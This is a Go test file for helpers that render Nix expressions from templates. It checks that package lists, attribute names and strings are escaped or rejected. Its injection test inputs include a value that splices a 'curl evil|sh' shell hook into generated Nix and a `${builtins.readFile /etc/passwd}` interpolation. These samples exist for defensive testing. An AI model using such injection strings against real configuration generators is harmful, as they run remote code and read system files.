package tmpl

import (
	"encoding/json"
	"os/exec"
	"strings"
	"testing"
	"text/template"
)

func TestNixPkgList(t *testing.T) {
	tests := []struct {
		name  string
		input []string
		want  string
	}{
		{"empty", nil, "[ ]"},
		{"single", []string{"git"}, "[ pkgs.git ]"},
		{"multiple", []string{"git", "curl", "jq"}, "[ pkgs.git pkgs.curl pkgs.jq ]"},
		{"attr_path", []string{"python312Packages.pip", "gcc-arm-embedded"}, "[ pkgs.python312Packages.pip pkgs.gcc-arm-embedded ]"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := nixPkgList(tt.input)
			if err != nil {
				t.Fatalf("nixPkgList(%v) error: %v", tt.input, err)
			}
			if got != tt.want {
				t.Errorf("nixPkgList(%v) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

// nixInjectionInputs are package/list items that would splice extra Nix code
// into the generated file if emitted verbatim.
var nixInjectionInputs = []string{
	`hello ]; enterShell = "echo pwned"; x = [ pkgs.hello`,
	"hello\nenterShell",
	`${builtins.readFile /etc/passwd}`,
	`"quoted"`,
	"a;b",
	"a b",
	".leading",
	"trailing.",
	"a..b",
	"1digit",
	"",
	"let",
	"pkgs.with",
}

func TestNixPkgList_RejectsInjection(t *testing.T) {
	for _, in := range nixInjectionInputs {
		t.Run(in, func(t *testing.T) {
			got, err := nixPkgList([]string{"jq", in})
			if err == nil {
				t.Fatalf("nixPkgList accepted %q, produced %q", in, got)
			}
		})
	}
}

func TestNixList(t *testing.T) {
	tests := []struct {
		name  string
		input []string
		want  string
	}{
		{"empty", nil, "[ ]"},
		{"single", []string{"git"}, "[ git ]"},
		{"multiple", []string{"git", "curl", "jq"}, "[ git curl jq ]"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := nixList(tt.input)
			if err != nil {
				t.Fatalf("nixList(%v) error: %v", tt.input, err)
			}
			if got != tt.want {
				t.Errorf("nixList(%v) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestNixList_RejectsInjection(t *testing.T) {
	for _, in := range nixInjectionInputs {
		t.Run(in, func(t *testing.T) {
			if got, err := nixList([]string{in}); err == nil {
				t.Fatalf("nixList accepted %q, produced %q", in, got)
			}
		})
	}
}

func TestNixFuncMap_TemplateFailsOnInjectedPackage(t *testing.T) {
	tpl := template.Must(template.New("t").Funcs(NixFuncMap()).Parse(`{ packages = {{ nixPkgList .Packages }}; }`))
	var buf strings.Builder
	err := tpl.Execute(&buf, map[string]any{
		"Packages": []string{"jq", `hello ]; enterShell = "curl evil|sh"; x = [ pkgs.hello`},
	})
	if err == nil {
		t.Fatalf("template rendered injected package: %q", buf.String())
	}
	if strings.Contains(buf.String(), "enterShell") {
		t.Errorf("injected code reached output: %q", buf.String())
	}
}

func TestNixAttrName(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"identifier", "GOFLAGS", "GOFLAGS"},
		{"dash_and_quote", "a-b'c", "a-b'c"},
		{"dotted_is_quoted", "a.b", `"a.b"`},
		{"injection_is_quoted", `X = "y"; enterShell`, `"X = \"y\"; enterShell"`},
		{"interpolation_is_escaped", "${evil}", `"\${evil}"`},
		{"keyword_is_quoted", "inherit", `"inherit"`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := NixAttrName(tt.input); got != tt.want {
				t.Errorf("NixAttrName(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestNixStringList(t *testing.T) {
	tests := []struct {
		name  string
		input []string
		want  string
	}{
		{"empty", nil, "[ ]"},
		{"single", []string{"git"}, `[ "git" ]`},
		{"multiple", []string{"git", "curl"}, `[ "git" "curl" ]`},
		{"with_interpolation", []string{"${HOME}/bin", "plain"}, `[ "\${HOME}/bin" "plain" ]`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := nixStringList(tt.input)
			if got != tt.want {
				t.Errorf("nixStringList(%v) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestNixString(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"plain", "hello", `"hello"`},
		{"with_interpolation", "hello ${world}", `"hello \${world}"`},
		{"with_backslash", `path\to\file`, `"path\\to\\file"`},
		{"with_double_quote", `say "hi"`, `"say \"hi\""`},
		{"all_three", `a\b "${c}`, `"a\\b \"\${c}"`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := nixString(tt.input)
			if got != tt.want {
				t.Errorf("nixString(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestNixBool(t *testing.T) {
	if got := nixBool(true); got != "true" {
		t.Errorf("nixBool(true) = %q, want %q", got, "true")
	}
	if got := nixBool(false); got != "false" {
		t.Errorf("nixBool(false) = %q, want %q", got, "false")
	}
}

func TestNixMultiline(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"plain", "echo hello", "echo hello"},
		{"with_interpolation", "echo ${var}", "echo ''${var}"},
		{"with_literal_quotes", "echo ''done''", "echo '''done'''"},
		// A lone quote before ${ must not fuse with the ${ escape into '''.
		{"quote_before_interpolation", "echo '${HOME}' x", `echo ${"'"}''${HOME}' x`},
		{"double_quote_before_interpolation", "echo ''${x}", "echo '''''${x}"},
		{"triple_quote", "a'''b", "a''''b"},
		{"triple_quote_before_interpolation", "'''${x}", `'''${"'"}''${x}`},
		{"trailing_quote", "echo it'", `echo it${"'"}`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := nixMultiline(tt.input)
			if got != tt.want {
				t.Errorf("nixMultiline(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

// TestNixMultiline_NixRoundTrip evaluates the escaped text inside a real Nix
// indented string and checks it decodes back to the input unchanged (no live
// antiquotation, no lost or doubled quotes).
func TestNixMultiline_NixRoundTrip(t *testing.T) {
	nix, err := exec.LookPath("nix-instantiate")
	if err != nil {
		t.Skip("nix-instantiate not available")
	}
	inputs := []string{
		"echo '${HOME}'",
		"docker build --build-arg V='${VERSION}' .",
		"echo ''${x}",
		"a'''b",
		"'''${x}",
		"echo it'",
		"'",
		"''",
		"$${x} ''\\n '$ ${",
	}
	for _, in := range inputs {
		t.Run(in, func(t *testing.T) {
			expr := "''\n" + nixMultiline(in) + "''"
			out, err := exec.Command(nix, "--eval", "--json", "--expr", expr).CombinedOutput()
			if err != nil {
				t.Fatalf("nix eval of %q failed: %v\n%s", expr, err, out)
			}
			var got string
			if err := json.Unmarshal(out, &got); err != nil {
				t.Fatalf("decoding %q: %v", out, err)
			}
			if got != in {
				t.Errorf("round trip of %q = %q", in, got)
			}
		})
	}
}

func TestNixAttrSet(t *testing.T) {
	tests := []struct {
		name  string
		input map[string]string
		want  string
	}{
		{"empty", map[string]string{}, "{ }"},
		{"single", map[string]string{"key": "val"}, `{ key = "val"; }`},
		{"multiple_sorted", map[string]string{"b": "2", "a": "1", "c": "3"}, `{ a = "1"; b = "2"; c = "3"; }`},
		{"injection_key_quoted", map[string]string{`K = "v"; enterShell = "pwn"; J`: "x"}, `{ "K = \"v\"; enterShell = \"pwn\"; J" = "x"; }`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := nixAttrSet(tt.input)
			if got != tt.want {
				t.Errorf("nixAttrSet(%v) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestIndent(t *testing.T) {
	tests := []struct {
		name  string
		n     int
		input string
		want  string
	}{
		{"zero_noop", 0, "hello\nworld", "hello\nworld"},
		{"four_spaces_multiline", 4, "line1\nline2", "    line1\n    line2"},
		{"empty_lines_preserved", 4, "line1\n\nline2", "    line1\n\n    line2"},
		{"single_line", 2, "hello", "  hello"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := indent(tt.n, tt.input)
			if got != tt.want {
				t.Errorf("indent(%d, %q) = %q, want %q", tt.n, tt.input, got, tt.want)
			}
		})
	}
}

func TestNindent(t *testing.T) {
	got := nindent(4, "hello\nworld")
	want := "\n    hello\n    world"
	if got != want {
		t.Errorf("nindent(4, \"hello\\nworld\") = %q, want %q", got, want)
	}
	// Verify it starts with a newline.
	if got[0] != '\n' {
		t.Error("nindent should start with a newline")
	}
}

func TestJoin(t *testing.T) {
	tests := []struct {
		name  string
		sep   string
		items []string
		want  string
	}{
		{"normal", ", ", []string{"a", "b", "c"}, "a, b, c"},
		{"empty", ", ", nil, ""},
		{"single", ", ", []string{"a"}, "a"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := join(tt.sep, tt.items)
			if got != tt.want {
				t.Errorf("join(%q, %v) = %q, want %q", tt.sep, tt.items, got, tt.want)
			}
		})
	}
}

func TestLowerUpper(t *testing.T) {
	if got := lower("HeLLo"); got != "hello" {
		t.Errorf("lower(\"HeLLo\") = %q, want %q", got, "hello")
	}
	if got := upper("HeLLo"); got != "HELLO" {
		t.Errorf("upper(\"HeLLo\") = %q, want %q", got, "HELLO")
	}
}

func TestContains(t *testing.T) {
	haystack := []string{"go", "python", "rust"}
	if !containsFunc(haystack, "go") {
		t.Error("contains should find 'go'")
	}
	if containsFunc(haystack, "java") {
		t.Error("contains should not find 'java'")
	}
}

func TestDict(t *testing.T) {
	t.Run("even_count", func(t *testing.T) {
		m, err := dict("a", 1, "b", "two")
		if err != nil {
			t.Fatalf("dict() error: %v", err)
		}
		if m["a"] != 1 {
			t.Errorf("dict[\"a\"] = %v, want 1", m["a"])
		}
		if m["b"] != "two" {
			t.Errorf("dict[\"b\"] = %v, want \"two\"", m["b"])
		}
	})
	t.Run("odd_returns_error", func(t *testing.T) {
		_, err := dict("a", 1, "b")
		if err == nil {
			t.Error("dict with odd count should return error")
		}
	})
}

func TestDefault(t *testing.T) {
	tests := []struct {
		name       string
		defaultVal any
		val        any
		want       any
	}{
		{"zero_string_returns_default", "fallback", "", "fallback"},
		{"non_zero_string_returns_value", "fallback", "actual", "actual"},
		{"zero_int_returns_default", 42, 0, 42},
		{"non_zero_int_returns_value", 42, 7, 7},
		{"nil_returns_default", "fallback", nil, "fallback"},
		{"false_returns_default", true, false, true},
		{"true_returns_value", false, true, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := default_(tt.defaultVal, tt.val)
			if got != tt.want {
				t.Errorf("default_(%v, %v) = %v, want %v", tt.defaultVal, tt.val, got, tt.want)
			}
		})
	}
}

func TestHasAny(t *testing.T) {
	if hasAny(nil) {
		t.Error("hasAny(nil) should be false")
	}
	if hasAny([]string{}) {
		t.Error("hasAny([]) should be false")
	}
	if !hasAny([]string{"a"}) {
		t.Error("hasAny([\"a\"]) should be true")
	}
}

func TestComment(t *testing.T) {
	input := "line1\nline2\nline3"
	got := comment("#", input)
	want := "# line1\n# line2\n# line3"
	if got != want {
		t.Errorf("comment(\"#\", %q) = %q, want %q", input, got, want)
	}

	// Empty lines get just the prefix.
	input2 := "line1\n\nline2"
	got2 := comment("#", input2)
	want2 := "# line1\n#\n# line2"
	if got2 != want2 {
		t.Errorf("comment(\"#\", %q) = %q, want %q", input2, got2, want2)
	}
}

func TestTrimTrailingNewline(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"no_newline", "hello", "hello"},
		{"single_newline", "hello\n", "hello"},
		{"multiple_newlines", "hello\n\n\n", "hello"},
		{"only_newlines", "\n\n", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := trimTrailingNewline(tt.input)
			if got != tt.want {
				t.Errorf("trimTrailingNewline(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}
